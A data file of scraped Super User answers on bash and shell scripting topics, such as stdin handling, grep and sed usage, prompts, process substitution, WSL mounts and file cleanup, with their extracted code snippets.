94,https://superuser.com/questions747884/,"['If the file argument is the first argument to your script, test that there is an argument ($1) and that it is a file. Else read input from stdin -', 'So your script could contain something like this:', 'e.g. then you can call the script like', 'or ', 'Edit\nSome explanation of the script:', '[ $# -ge 1 -a -f ""$1"" ] - If at least one command line argument ($# -ge 1) AND (-a operator) the first argument is a file (-f tests if ""$1"" is a file) then the test result is true.', '&& is the shell logical AND operator. If test is true, then assign input=""$1"" and cat $input will output the file.', '|| is the shell logical OR operator. If the test is false, then commands following || are parsed. input is assigned to ""-"". The command cat - reads from the keyboard.', 'Summarising, if the script argument is provided and it is a file, then variable input is assigned to the file name. If there is no valid argument then cat reads from the keyboard.']","[<code>$1</code>, <code>#!/bin/bash
[ $# -ge 1 -a -f ""$1"" ] &amp;&amp; input=""$1"" || input=""-""
cat $input
</code>, <code>./myscript.sh filename
</code>, <code>who | ./myscript.sh
</code>, <code>[ $# -ge 1 -a -f ""$1"" ]</code>, <code>$# -ge 1</code>, <code>&amp;&amp;</code>, <code>input=""$1""</code>, <code>cat $input</code>, <code>||</code>, <code>||</code>, <code>cat -</code>]"
95,https://superuser.com/questions270529/,"[""Here is a simple one-liner. It doesn't need bash-specific or non-POSIX tricks, or even a named pipe. All you really need is to decouple the termination of tail from grep. That way, once grep ends, the script can continue even if tail hasn't ended yet. So this simple method will get you there:"", ""grep will block until it has found the string, whereupon it will exit. By making tail run from it's own sub-shell, we can place it in the background so it runs independently. Meanwhile, the main shell is free to continue execution of the script as soon as grep exits. tail will linger in its sub-shell until the next line has been written to the logfile, and then exit (possibly even after the main script has terminated). The main point is that the pipeline no longer waits for tail to terminate, so the pipeline exits as soon as grep exits."", 'Some minor tweaks:']","[<code>tail</code>, <code>grep</code>, <code>grep</code>, <code>tail</code>, <code>( tail -f -n0 logfile.log &amp; ) | grep -q ""Server Started""
</code>, <code>grep</code>, <code>tail</code>, <code>grep</code>, <code>tail</code>, <code>tail</code>, <code>grep</code>, <code>tail</code>, <code>tail</code>, <code>tail</code>, <code>grep</code>]"
96,https://superuser.com/questions531592/,"['You could also use ""cmd //c tree"" to use Windows\' tree', 'Explanation:', '/C      Carries out the command specified by string and then\n  terminates', '(extra slash for escaping)', ""/a use to run with ascii chars in case it doesn't display right."", 'Answered in greater detail here: https://stackoverflow.com/q/515309/1261166']","[<code>""cmd //c tree""</code>, <code>tree</code>]"
97,https://superuser.com/questions604998/,"[""edit: I'm still getting upvotes for this years later. Please don't go for this answer, the answer using iptables here is far superior in my opinion."", 'or only tcp-syn, or only tcp-ack (my guess would be that one), depending on what you need.']","[<code>iptables</code>, <code>tcpdump port 443 and '(tcp-syn|tcp-ack)!=0'
</code>, <code>tcp-syn</code>, <code>tcp-ack</code>]"
98,https://superuser.com/questions1107680/,"['If you are going to use  sed, there is no need to also use grep.  Try:', 'Example:', 'Similarly, if we use awk, there is no need to also grep:', 'Example:', 'How it works:', '-F""[ \',]+""', 'This tells awk to use spaces, single quotes, or commas or any combination thereof as field separators.', '/version:/{print $2}', 'If a line contains version:, then print the second field.']","[<code>npm info webpack | sed -En ""s/version: '(.*)',/\1/p""
</code>, <code>$ echo  ""version: '2.1.0-beta.12',"" | sed -En ""s/version: '(.*)',/\1/p""
2.1.0-beta.12
</code>, <code>npm info webpack | awk -F""[ ',]+"" '/version:/{print $2}'
</code>, <code>$ echo  ""version: '2.1.0-beta.12',"" | awk -F""[ ',]+"" '/version:/{print $2}'
2.1.0-beta.12
</code>, <code>-F""[ ',]+""</code>, <code>/version:/{print $2}</code>, <code>version:</code>]"
99,https://superuser.com/questions1043672/,"['By default, echo includes a newline character at the end of the output. However, PHP and the online sites you used do not include the newline. To suppress the newline character, use the -n flag:', 'Output:', 'See: help echo', 'or with printf:']","[<code>echo</code>, <code>-n</code>, <code>echo -n ""hello"" | md5sum
</code>, <code>help echo</code>, <code>printf ""%s"" ""hello"" | md5sum
</code>]"
100,https://superuser.com/questions154332/,"['The unset built-in command takes an option, -f, to delete functions:', 'Form the unset entry in the bash manpage:', 'If -f is specified, each name refers to a shell function, and the function definition is removed.', 'Note: -f is only really necessary if a variable with the same name exists. If you do not also have a variable named foo, then unset foo will delete the function.']","[<code>-f</code>, <code>unset -f foo
</code>, <code>-f</code>, <code>foo</code>, <code>unset foo</code>]"
101,https://superuser.com/questions608106/,"['You could install Cygwin or MSYS/MinGW, or you could install a full Linux distribution in a virtual machine (for example, using VirtualBox).']",[]
102,https://superuser.com/questions461981/,"[""Here's a way that utilizes bash parameter expansion and its IFS special variable."", ""We use a subshell to avoid overwriting the value of IFS in the current environment. In that subshell, we then modify the value of IFS so that the first character is a newline (using $'...' quoting). Finally, we use parameter expansion to print the contents of the array as a single word; each element is separated by the first charater of IFS."", 'To capture to a variable:', 'If your bash is new enough (4.2 or later), you can (and should) still use printf with the -v option:', 'In either case, you may not want the final newline in var. To remove it:']","[<code>IFS</code>, <code>$ System=('s1' 's2' 's3' 's4 4 4')
$ ( IFS=$'\n'; echo ""${System[*]}"" )
</code>, <code>IFS</code>, <code>IFS</code>, <code>$'...'</code>, <code>IFS</code>, <code>$ var=$( IFS=$'\n'; echo ""${System[*]}"" )
</code>, <code>printf</code>, <code>-v</code>, <code>$ printf -v var ""%s\n"" ""${System[@]}""
</code>, <code>var</code>, <code>$ var=${var%?}    # Remove the final character of var
</code>]"
103,https://superuser.com/questions332356/,"['OMG, I totally forgot about cut!', '^ does the trick! >_<']","[<code>cut</code>, <code>grep -nr sumthin * | cut -c -80
</code>]"
104,https://superuser.com/questions188240/,['Found it  here '],"[<code>for f in /abcd/xyz* do
   [ ""$f"" -nt /abcd/test.txt ] &amp;&amp; echo ""file f$ found"" done
</code>]"
105,https://superuser.com/questions709515/,"[""$PATH is evaluated by your shell, so your check doesn't work as you expect it to."", '/etc/sudoers is configured to replace your PATH with a default one.', 'sudo does not load a login shell environment before executing the command, so the default PATH from /etc/sudoers is used. su - does open a login shell, which involves loading /etc/profile. See man bash, section INVOCATION.', ""Just remove the PATH reset in /etc/sudoers. It's likely a rule called secure_path."", 'In CentOS you can add PATH to the Defaults env_keep section:']","[<code>$PATH</code>, <code>/etc/sudoers</code>, <code>PATH</code>, <code>sudo</code>, <code>PATH</code>, <code>/etc/sudoers</code>, <code>su -</code>, <code>/etc/profile</code>, <code>man bash</code>, <code>PATH</code>, <code>/etc/sudoers</code>, <code>secure_path</code>, <code>PATH</code>, <code>Defaults env_keep</code>, <code>Defaults    env_keep = ""COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR \
                        LS_COLORS MAIL PS1 PS2 QTDIR USERNAME \
                        LANG LC_ADDRESS LC_CTYPE LC_COLLATE LC_IDENTIFICATION \
                        LC_MEASUREMENT LC_MESSAGES LC_MONETARY LC_NAME LC_NUMERIC \
                        LC_PAPER LC_TELEPHONE LC_TIME LC_ALL LANGUAGE LINGUAS \
                        _XKB_CHARSET XAUTHORITY PATH""
</code>]"
106,https://superuser.com/questions1164818/,"['Windows 10 v1903 includes a built-in WSL export/import command.  Specifically, wsl --export, which produces a tar and wsl --import, which imports a previously exported tar. You can then move this file between computers.', 'You can also specify stdin/stdout with -, which should allow you to directly transfer to another machine and import using a remote shell like ssh.']","[<code>wsl --export</code>, <code>tar</code>, <code>wsl --import</code>, <code>tar</code>, <code>-</code>, <code>ssh</code>]"
107,https://superuser.com/questions584013/,"[""1 year update: I came to the conclusion that Cmd's autocomplete is unusable, and stopped using it."", 'I installed Clink which gives you Bash-style autocompletion in Cmd.', 'Clink combines the native Windows shell cmd.exe with the powerful command line editing features of the GNU Readline library, which provides rich completion, history, and line-editing capabilities', ""It's brilliant.""]",[]
108,https://superuser.com/questions142945/,"[""The wmctrl command seems to do the job. It was already installed for me, but it's available in the repositories in case anyone needs it."", 'Lists currently open windows (including the gnome panels).', ""Gives focus to a window containing STRING in its title. I'm not sure what happens if more than one window meets that condition.\nIn my case the command was:""]","[<code>wmctrl -l 
</code>, <code>wmctrl -a STRING
</code>, <code>wmctrl -a Firefox
</code>]"
109,https://superuser.com/questions482435/,"['To delete all files which name has name, you can use it:']","[<code>find  . -name 'name*' -exec rm {} \;
</code>]"
110,https://superuser.com/questions202212/,"['Just replace \\w with \\$PWD:', ""Anyway if you mind a little tip, I'd write something like:""]","[<code>\w</code>, <code>\$PWD</code>, <code>PS1=""\[\`if [[ \$? = ""0"" ]]; then echo '\e[32m\h\e[0m'; else echo '\e[31m\h\e[0m' ; fi\`:\$PWD\n\$ ""
</code>, <code>PS1='\[`[ $? = 0 ] &amp;&amp; X=2 || X=1; tput setaf $X`\]\h\[`tput sgr0`\]:$PWD\n\$ '
</code>]"
111,https://superuser.com/questions345101/,"['With grep:', 'Or, if you have ack-grep installed, simply:', 'If you want to limit the search in C files, with ack-grep:', 'ack-grep can also be installed on OSX but the executable is called just ack.']","[<code>grep</code>, <code>grep -R ""toUppercase()"" *
</code>, <code>ack-grep ""toUppercase""
</code>, <code>ack-grep</code>, <code>ack-grep -cc ""toUppercase()""
</code>, <code>ack-grep</code>, <code>ack</code>]"
112,https://superuser.com/questions1203270/,"[""What you've typed is a backtick - it is the start of an instruction to bash to evaluate what you type as a command. The > is displayed to indicate you are still entering the command on the next line. "", ""If you close the backtick you'll find the whole command will run. E.g.""]","[<code>&gt;</code>, <code>~$ cd `
&gt; echo /var`
/var$
</code>]"
113,https://superuser.com/questions392872/,"['You can use the following command to delete all files matching your criteria:', 'How it works:', 'ls lists all files (one by line since the result is piped).', 'grep -P ""^A.*[0-9]{2}$"" filters the list of files and leaves only those that match the regular expression ^A.*[0-9]{2}$', '.* indicates any number of occurrences of ., where . is a wildcard matching any character.', '[0-9]{2} indicates exactly two occurrences of [0-9], that is, any digit.', 'xargs -d""\\n"" rm executes rm line once for every line that is piped to it.', 'Where am I wrong?', ""For starters, rm doesn't accept a regular expression as an argument. Besides the wildcard *, every other character is treated literally."", 'Also, your regular expression is slightly off. For example, * means any occurrences of ... in a regular expression, so A* matches A, AA, etc. and even an empty string.', 'For more information, visit Regular-Expressions.info.']","[<code>ls | grep -P ""^A.*[0-9]{2}$"" | xargs -d""\n"" rm
</code>, <code>ls</code>, <code>grep -P ""^A.*[0-9]{2}$""</code>, <code>^A.*[0-9]{2}$</code>, <code>.*</code>, <code>.</code>, <code>.</code>, <code>[0-9]{2}</code>, <code>[0-9]</code>, <code>xargs -d""\n"" rm</code>, <code>rm line</code>, <code>line</code>, <code>rm</code>, <code>*</code>, <code>*</code>, <code>...</code>, <code>A*</code>, <code>A</code>, <code>AA</code>]"
114,https://superuser.com/questions1162555/,"['man bash', '[...]', '[...]']","[<code>   echo [-neE] [arg ...]
          Output  the  args,  separated  by spaces, followed by a newline.
          The return status is 0 unless a write error occurs.   If  -n  is
          specified, the trailing newline is suppressed.  If the -e option
          is given,  interpretation  of  the  following  backslash-escaped
          characters  is  enabled.
</code>, <code>   Arithmetic Expansion
       Arithmetic  expansion allows the evaluation of an arithmetic expression
       and the substitution of the result.  The format for  arithmetic  expan‐
       sion is:

              $((expression))
</code>, <code>   Constants with a leading 0 are interpreted as octal numbers.  A leading
   0x or  0X  denotes  hexadecimal.   Otherwise,  numbers  take  the  form
   [base#]n,  where the optional base is a decimal number between 2 and 64
   representing the arithmetic base, and n is a number in that  base.   If
   base#  is omitted, then base 10 is used.  When specifying n, the digits
   greater than 9 are represented by the lowercase letters, the  uppercase
   letters, @, and _, in that order.  If base is less than or equal to 36,
   lowercase and uppercase letters may be used interchangeably  to  repre‐
   sent numbers between 10 and 35.
</code>]"
115,https://superuser.com/questions1123552/,"[""Change the 22 port to a other one,such as 2222,in the file /etc/ssh/sshd_config,then restart the ssh service by the commond sudo service ssh --full-restart,you will successfully login.But I don't know the reason."", 'I also try use it as a remote gdb server for visual studio by VisualGDB,it not works well.\nVisualGDB will support it in the next version as the offical website shows.The link is https://sysprogs.com/w/forums/topic/visualgdb-with-windows-10-anniversary-update-linux-support/#post-9274']","[<code>/etc/ssh/sshd_config</code>, <code>sudo service ssh --full-restart</code>]"
116,https://superuser.com/questions479726/,"['it is indeed not (well) documented and I guess 99% of the bash user on this planed do set HISTSIZE to a veeery large number.', 'In the GNU bash history is handled through the mighty readline library. The library has the option to limit the history size (""stifle"" in readline jargon) or not and bash simply sets the readline history to stifled/unstifled. If you look into e.g. GNU bash version 4.2, file variables.c, line 4443, function void sv_histsize (char*)\nyou\'ll find this comment (and the whole stifling/unstifling in the function that follows):', '/* What to do after the HISTSIZE or HISTFILESIZE variables change.\n  If there is a value for this HISTSIZE (and it is numeric), then stifle\n  the history.  Otherwise, if there is NO value for this variable,\n  unstifle the history.  If name is HISTFILESIZE, and its value is\n  numeric, truncate the history file to hold no more than that many\n  lines. */', 'So this should do the trick:', 'And also this (if you feel defiant):', 'Hope this helps.']","[<code>export HISTSIZE=""""
</code>, <code>export HISTSIZE=""GOTCHA""
</code>]"
117,https://superuser.com/questions866683/,"[""The answer is simple, almost evident in the question. Here's why:"", 'The shell zsh is not bash, it is a different shell. zsh will not use the default files built for bash: .bashrc or .bash_profile. These two files are startup configuration files for bash. zsh has its own startup configuration files.', 'You can find out more about them here on the zsh intro page:', 'There are five startup files that zsh will read commands from:', ""You had mentioned your aliases don't work, to fix this, apply your aliases here like so:"", '~/.zshrc']","[<code>zsh</code>, <code>bash</code>, <code>zsh</code>, <code>bash</code>, <code>.bashrc</code>, <code>.bash_profile</code>, <code>bash</code>, <code>zsh</code>, <code>zsh</code>, <code>$ZDOTDIR/.zshenv
$ZDOTDIR/.zprofile
$ZDOTDIR/.zshrc
$ZDOTDIR/.zlogin
$ZDOTDIR/.zlogout
</code>, <code>~/.zshrc</code>, <code>alias sz='source ~/.zshrc'     # Easily source your ~/.zshrc file.
alias ls='pwd; ls --color'     # Alias 'ls' to: pwd + ls + color.
</code>]"
118,https://superuser.com/questions304267/,['It will show you the directory location of all mounted volumes. Then just cd into the drive you want.'],"[<code># cd /Volumes &amp;&amp; ls
</code>]"
119,https://superuser.com/questions619016/,"['&& is a logical operator. ; is simple sequencing.', 'In cmd1 && cmd2, cmd2 will only be run if cmd1 exits with a successful return code.', ""Whereas in cmd1; cmd2, cmd2 will run regardless of the exit status of cmd1 (assuming you haven't set your shell to exit on all failure in your script or something)."", ""On a related note, with cmd1 || cmd2, using the || 'OR' logical operator, cmd2 will only be run if cmd1 fails (returns a non-zero exit code)."", 'These logical operators are sometimes used in scripts in place of a basic if statement. For example,', '...can be more concisely achieved with:']","[<code>&amp;&amp;</code>, <code>;</code>, <code>cmd1 &amp;&amp; cmd2</code>, <code>cmd1; cmd2</code>, <code>cmd1 || cmd2</code>, <code>||</code>, <code>if [[ -f ""$foo"" ]]; then mv ""$foo"" ""${foo%.txt}.mkd""; fi
</code>, <code>[[ -f ""$foo"" ]] &amp;&amp; mv ""$foo"" ""${foo%.txt}.mkd""
</code>]"
120,https://superuser.com/questions126290/,"['You can combine different search expressions with the logical operators -or or -and, so your case can be written as', 'This also show that you do not need to escape special shell characters when you use quotes.', 'Edit', 'Since -or has lower precedence than the implied -and between -type and the first -name put name part into parentheses as suggested by Chris.']","[<code>-or</code>, <code>-and</code>, <code>find . -type f \( -name ""*.shtml"" -or -name ""*.css"" \)
</code>, <code>-or</code>, <code>-and</code>, <code>-type</code>, <code>-name</code>]"
121,https://superuser.com/questions400714/,"['You can use the ""cat"" command to create the remote file. ', 'The -T disables pseudo-terminal allocation and stops you from getting the message,', 'Pseudo-terminal will not be allocated because stdin is not a terminal.']","[<code>echo 'Some Text' | ssh user@remotehost -T ""cat &gt; /remotefile.txt""
</code>, <code>-T</code>]"
122,https://superuser.com/questions1064813/,"[""Why don't you guys just Right Click? here is how to enable copy and paste:"", 'Check the box that says Quick edit Mode, and you are set!', '', 'Good day!', '-- \nActivate Quick Edit mode, then mouse left-click is select text, right DOUBLE-click is PASTE']",[]
123,https://superuser.com/questions119649/,"[""Your script should use cd or pushd and popd to move into the directory that will be the root of the archive before issuing the zip command.  How you do this exactly will depend on how the script knows what to zip up.  But, if you want /Users/me/development/something/folder zipped with internal paths of just ./folder, you'd need to do this:"", 'That will result in your out.zip containing the relative paths you want.', ""If you need assistance with scripting that, you'll need to show us your script.""]","[<code>cd</code>, <code>pushd</code>, <code>popd</code>, <code>zip</code>, <code>pushd /Users/me/development/something
zip -r /path/to/out.zip ./folder/
popd
</code>]"
124,https://superuser.com/questions1109993/,"['Good news, it is now possible to mount USB media (including formatted as FAT) and network shares with drvfs on Windows 10:', 'Mount removable media: (e.g. D:)', 'To safely unmount', 'You can also mount network shares without smbfs:', 'You need at least Build 16176 so you might have to opt-in to the Windows Insider programm and then update Windows. Source: https://blogs.msdn.microsoft.com/wsl/2017/04/18/file-system-improvements-to-the-windows-subsystem-for-linux/']","[<code>$ sudo mkdir /mnt/d
$ sudo mount -t drvfs D: /mnt/d
</code>, <code>$ sudo umount /mnt/d
</code>, <code>$ sudo mount -t drvfs '\\server\share' /mnt/share
</code>]"
125,https://superuser.com/questions550837/,"[""jjlin's answer is the way to go. I just want to add a few choices for directories:"", 'Delete all extracted files, no directories:', 'Delete extracted files and empty directories only', 'With no options, rmdir deletes only empty directories, it will leave files and non-empty folders alone so you can safely run it on *.', 'Delete everything extracted, but prompt for a confirmation before each deletion:', 'The -i flag will cause rm to prompt before every removal, you can choose Yes or No. ', 'Delete everything extracted, directories included:']","[<code>unzip -lqq file.zip | gawk -F""  "" '{print $NF;}' |
  while IFS= read -r n; do rm ""$n""; done
</code>, <code>unzip -lqq file.zip | gawk -F""  "" '{print $NF;}' |
  while IFS= read -r n; do rm ""$n""; done; rmdir *
</code>, <code>rmdir</code>, <code>*</code>, <code>unzip -lqq file.zip | gawk -F""  "" '{print $NF;}' |
  while IFS= read -r n; do rm -ri ""$n""; done; rmdir *
</code>, <code>-i</code>, <code>rm</code>, <code>unzip -lqq file.zip | gawk -F""  "" '{print $NF;}' |
  while IFS= read -r n; do rm -rf ""$n""; done
</code>]"
126,https://superuser.com/questions633605/,"[""ln does take multiple arguments, but don't forget to give a target directory in that case."", 'So, in your example . is the target directory, so it should be as easy as', 'From man ln; the command above uses the 3rd form:']","[<code>ln</code>, <code>.</code>, <code>ln -s ../source/*.bar .
</code>, <code>man ln</code>, <code>ln [OPTION]... [-T] TARGET LINK_NAME   (1st form)
ln [OPTION]... TARGET                  (2nd form)
ln [OPTION]... TARGET... DIRECTORY     (3rd form)
ln [OPTION]... -t DIRECTORY TARGET...  (4th form)
</code>]"
127,https://superuser.com/questions368784/,['ls(1) /sort:'],"[<code>ls(1)</code>, <code>/sort</code>, <code>-S     sort by file size
</code>]"
128,https://superuser.com/questions360966/,"['Short answer: see BashFAQ #50 (""I\'m trying to put a command in a variable, but the complex cases always fail!"").', ""Long answer: Putting commands (or parts of commands) into variables and then getting them back out intact is complicated.  When the shell expands a variable on the command line, if the variable was in double-quotes it's not parsed; if it was not in quotes, spaces in it are parsed as argument breaks, but quotes and escape are not parsed.  In either case, putting quotes in the variable's value does nothing useful."", 'Usually, the best way to do this sort of thing is using an array instead of a simple text variable:']","[<code>FLAGS=(--archive --exclude=""foo bar.txt"")
rsync ""${FLAGS[@]}"" dir1 dir2
</code>]"
129,https://superuser.com/questions61727/,"['History (acquired not through research but through spending entirely too much time hanging out with Bell Labs people):', ""In the beginning (if you consider the beginning to be Unix Version 7) was the Bourne shell.  Steve Bourne was the first to show that the shell which controlled the user's interaction could be a user program and not a special part of the operating system.  A historic breakthrough.  The shell itself was relatively clean for scripting, but had no command-line editing or job control.  Bourne's Introduction to the Unix Shell is still useful for beginning users today."", 'Edit: I\'ve ignored some ""prehistory"" from Ken Thompson and John Mashey, also from Multics.  I\'m sure Bourne was aware of all this work (he was in the same lab, 1127, at Bell Labs), but Bourne\'s shell was definitive, and the earlier work had little influence except as interpreted by Steve Bourne.  For example, although Ken later wrote the Plan 9 C compiler and was very influential on Plan 9, but Tom Duff\'s paper on the Plan 9 shell (rc) mentions only Bourne\'s shell, not Thompson\'s.', 'The shell is just a user program, so anybody can write one.  As Version 7 Unix was being created in New Jersey, Berkeley Unix was being created in California.  Bill Joy at Berkeley wrote csh, the C shell.  Joy added job control and history, and later command-line editing, but was not aware of Bourne\'s work and so based his language on the Thompson shell (which I considered ""prehistoric"" in the previous bullet).  The Unix community loved job control, but they also loved Bourne\'s language.  For a not-particularly-good polemic against the csh language, see Csh Programming Considered Harmful.  For a time, many people used csh interactively for its job-control and history features, but used Bourne\'s sh to write scripts.  This situation was less than ideal.', 'Edit: Thanks to DigitalRoss for straightening me out on the chronology of csh.  Since I got my education from people who refer to BSD as ""the Berkeley heresy"", I was pretty short of facts there.', 'Dave Korn at Bell Labs did a brilliant re-engineering of the Bourne shell to produce the Korn shell (ksh).  It was fully backward compatible with Bourne shell sh but provided a boatload of invaluable improvements.  ksh became the basis of a POSIX standard and was shipped standard with Sun software.  (This despite the fact that Bill Joy left Berkeley to help found Sun and was one of their leading software guys.)', 'Bell Labs and AT&T stupidly fail to make ksh open source. ksh88 is widely used, but having sources is not legal.  Certain people become so addicted that they become digital criminals.', 'Edit: Was this really so stupid?   Hard to know. Berkeley was already giving Unix away, and other corporations were soon to follow, but this was still the era when the Corporate Masters believed in charging for Unix.  But the results: AT&T Unix is dead, after having been sold off to various parties any number of times. BSD and its derivatives are alive and well, but these upstart things called ""Linux"" and ""GNU"" have a huge fraction of mindshare that once belonged to Bell Labs.', 'The Free Software Foundation does a ""clean-room"", from scratch implementation of a POSIX shell, taking all of Dave Korn\'s ideas as then current, plus in usual FSF style adding new features of their own, such as programmable completion.  They call it the ""Bourne again"" shell, or bash.', 'In the middle 1990s AT&T open-sources ksh93, but by then it is too late for widespread adoption.  The licensing agreement is weirdly nonstandard.  bash and ksh diverge, and ksh never achieves market share commensurate with its place in history.', 'Lessons:', 'The first adequate product to market wins (sh).', 'People love new features (job control, command completion), but they love them even more when their old scripts continue to work.', 'Edit: Professors of engineering should leave history to historians of science :-)']","[<code>csh</code>, <code>csh</code>, <code>sh</code>, <code>csh</code>, <code>sh</code>, <code>ksh</code>, <code>ksh</code>, <code>ksh88</code>, <code>bash</code>, <code>ksh93</code>, <code>bash</code>, <code>ksh</code>, <code>ksh</code>]"
130,https://superuser.com/questions44787/,[],"[<code>for dir in ~/projects/git/*; do (cd ""$dir"" &amp;&amp; git pull); done
</code>]"
131,https://superuser.com/questions1108120/,"[""The answer given by Wouter works better overall once set up, but it can be slightly confusing to get working as the correct option doesn't always appear. Follow these steps:"", '', 'You can simply run the following command from within your Windows Bash shell [source]:', ""or else edit .inputrc manually with a text-editor to add set bell-style none on it's own line."", ""You'll need to restart your currently open bash shell before it takes affect."", ""This will only work for your current user, and won't help if you ssh into other accounts (unless you run that command again for each account).""]","[<code>echo ""set bell-style none"" &gt;&gt; ~/.inputrc
</code>, <code>.inputrc</code>, <code>set bell-style none</code>]"
132,https://superuser.com/questions649186/,"[""Like Levans, I have been unable to replicate this, but have you considered using rsync over ssh instead?  If you're copying large numbers of files, rsync may be a better option than scp.  There are a number of good guides to it online, such as these:"", 'http://troy.jdmz.net/rsync/index.html\nhttps://calomel.org/rsync_tips.html', 'That first link deals with automated backups via cron, so some of the instructions (like creating an ssh key without a passphrase) may not be relevant to you.']",[]
133,https://superuser.com/questions124336/,"['One way to deal with \'meta\' key sequences not working on the OS X terminal is to assign specific character sequences to particular keypresses. For those of us with non-US keyboards, this is often a better solution than the ""Use option as meta"" setting mentioned in the comments of other answers. (Many international Mac keyboards are essentially unusable for development work without the Option/alt key because certain critical characters are otherwise unavailable. There\'s no # on a UK Mac keyboard, for example.)', 'To get word-left and word-right working for bash, I\'ve used the ""Keyboard"" section of the Settings in Terminal. You can tell it to generate particular code sequences when particular keypresses are made. I\'ve got mine configured so that alt+◀ generates \\033b (that\'s actually two characters: Esc, and then a lowercase b) and alt+▶ generates \\033f (i.e., Esc f). This lets you use the arrow keys with the option key held down to get the word left and right behaviour.', ""What I've not yet worked out is how to get the Esc key to work - in theory you should be able to use that for 'meta' sequences but it appears not to work. (So just typing Esc+b should go back one word.)"", 'If you have a US keyboard layout, or some other keyboard in which Apple have seen fit to provide all the keys you actually need, then as others have suggested, ""Use option as meta key"" (also on the Keyboard section of Terminal\'s settings) is probably a better choice because you\'ll be able to get to any meta key combination. With that switched on, Alt+b works as expected.']","[<code>\033b</code>, <code>\033f</code>, <code>Esc f</code>]"
134,https://superuser.com/questions1059781/,"['This is called process substitution.', 'The <(list) syntax is supported by both, bash and zsh. It provides a way to pass the output of a command (list) to another command when using a pipe (|) is not possible. For example when a command just does not support input from STDIN or you need the output of multiple commands: ', '<(list) connects the output of list with a file in /dev/fd, if supported by the system, otherwise a named pipe (FIFO) is used (which also depends on support by the system; neither manual says what happens if both mechanisms are not supported, presumably it aborts with an error). The name of the file is then passed as argument on the command line.', 'zsh additionally supports =(list) as possible replacement for <(list). With =(list) a temporary file is used instead of file in /dev/fd or a FIFO. It can be used as a replacement for <(list) if the program needs to lseek in the output.', 'According to the ZSH manual there might also be other issues with how <(list) works:', 'The = form is useful as both the /dev/fd and the named pipe implementation of <(...) have drawbacks. In the former case, some programmes may automatically close the file descriptor in question before examining the file on the command line, particularly if this is necessary for security reasons such as when the programme is running setuid. In the second case, if the programme does not actually open the file, the subshell attempting to read from or write to the pipe will (in a typical implementation, different operating systems may have different behaviour) block for ever and have to be killed explicitly. In both cases, the shell actually supplies the information using a pipe, so that programmes that expect to lseek (see man page lseek(2)) on the file will not work.']","[<code>&lt;(list)</code>, <code>bash</code>, <code>zsh</code>, <code>list</code>, <code>|</code>, <code>STDIN</code>, <code>diff &lt;(ls dirA) &lt;(ls dirB)
</code>, <code>&lt;(list)</code>, <code>list</code>, <code>/dev/fd</code>, <code>zsh</code>, <code>=(list)</code>, <code>&lt;(list)</code>, <code>=(list)</code>, <code>/dev/fd</code>, <code>&lt;(list)</code>, <code>&lt;(list)</code>, <code>=</code>, <code>/dev/fd</code>, <code>&lt;(...)</code>, <code>lseek(2)</code>]"
135,https://superuser.com/questions1268868/,"[""here's an example libasound program with just enough definitions to get basic 2-channel 44.1k wav output going without the headers."", ""EDIT: I'm actually not sure if straight up dumping the data as wav would work, as noise when recording could easily damage it, but you can probably do something like a sine wave of bits at high frequency which is more reliable"", 'EDIT2: if aplay is present and works you can also use that and just write a program that output raw audio and pipe it into aplay or anything that can play audio', 'EDIT3: modified it to not use any headers at all', ""if -lasound doesn't compile, add -L/path/where/libasound/is/located""]","[<code>/*
    gcc alsa_noheader.c -lasound
    cat stuff.wav | ./a.out
*/

typedef unsigned int uint;
typedef unsigned long ulon;

int printf(char*, ...);
void* malloc(long);
long read(int fd, void* buf, ulon count);

int snd_pcm_open(void**, char*, int, int);
ulon snd_pcm_hw_params_sizeof();
int snd_pcm_hw_params_any(void*, void*);
int snd_pcm_hw_params_set_access(void*, void*, int);
int snd_pcm_hw_params_set_format(void*, void*, int);
int snd_pcm_hw_params_set_channels(void*, void*, uint);
int snd_pcm_hw_params_set_rate_near(void*, void*, uint*, int*);
int snd_pcm_hw_params(void*, void*);
int snd_pcm_hw_params_get_period_size(void*, ulon*, int*);
long snd_pcm_writei(void*, void*, uint);
int snd_pcm_prepare(void*);
int snd_pcm_drain(void*);
int snd_pcm_close(void*);

int main(int argc, char* argv[])
{
    void* pcm;
    void* params;

    int rate;
    int nchannels;
    ulon frames;
    void* buf;
    int bufsize;
    long nread;

    snd_pcm_open(&amp;pcm, ""default"", 0, 0);
    params = malloc(snd_pcm_hw_params_sizeof());
    snd_pcm_hw_params_any(pcm, params);

    /* 3 = rw_interleaved */
    snd_pcm_hw_params_set_access(pcm, params, 3);

    /* 2 = 16-bit signed little endian */
    snd_pcm_hw_params_set_format(pcm, params, 2);

    /* 2 channels */
    nchannels = 2;
    snd_pcm_hw_params_set_channels(pcm, params, nchannels);

    /* sample rate */
    rate = 44100;
    snd_pcm_hw_params_set_rate_near(pcm, params, &amp;rate, 0);

    snd_pcm_hw_params(pcm, params);
    snd_pcm_hw_params_get_period_size(params, &amp;frames, 0);

    bufsize = frames * nchannels * 2;
    buf = malloc(bufsize);

    /* read file from stdin */
    while (nread = read(0, buf, bufsize) &gt; 0)
    {
        if (snd_pcm_writei(pcm, buf, frames) == -29)
        {
            printf(""W: underrun\n"");
            snd_pcm_prepare(pcm);
        }
    }

    snd_pcm_drain(pcm);
    snd_pcm_close(pcm);

    return 0;
}
</code>]"
136,https://superuser.com/questions835587/,"['Inside single-quotes, the shell expands nothing.  Place them inside double-quotes instead:', ""Let's examine how this works by looking at:"", 'When the shell variable appears, it is always inside double-quotes. Consequently, it is properly expanded.', ""Quoting like this is a bit subtle.  We have single-quoted strings that contain double-quotes as characters and are next to double-quoted strings.  To understand this better, let's take this fragment as a an example:"", 'Taking each character in turn:', '"" is a literal double-quote character that is inside of a single-quoted string. (For brevity, the beginning of this string is not shown in this fragment.)', ""' closes a single-quoted string."", '"" opens a double-quoted string.', '$TR_TORRENT_NAME is a shell variable that is expanded inside double-quotes.', '"" closes the double-quoted string.', ""' opens a new single-quoted string."", '"" places a double-quote character inside the single-quoted string.']","[<code>curl -u &lt;my-api-token&gt;: \
  -X POST https://api.pushbullet.com/v2/pushes \
  --header 'Content-Type: application/json' \
  --data-binary '{""type"": ""note"", ""title"": ""'""$TR_TORRENT_NAME""'"", \
  ""body"": ""'""$TR_TORRENT_NAME completed""'.""}'
</code>, <code>$ TR_TORRENT_NAME=MyTorrent
$ echo '{""type"": ""note"", ""title"": ""'""$TR_TORRENT_NAME""'"", ""body"": ""'""$TR_TORRENT_NAME completed""'.""}'
{""type"": ""note"", ""title"": ""MyTorrent"", ""body"": ""MyTorrent completed.""}
</code>, <code> ""'""$TR_TORRENT_NAME""'""
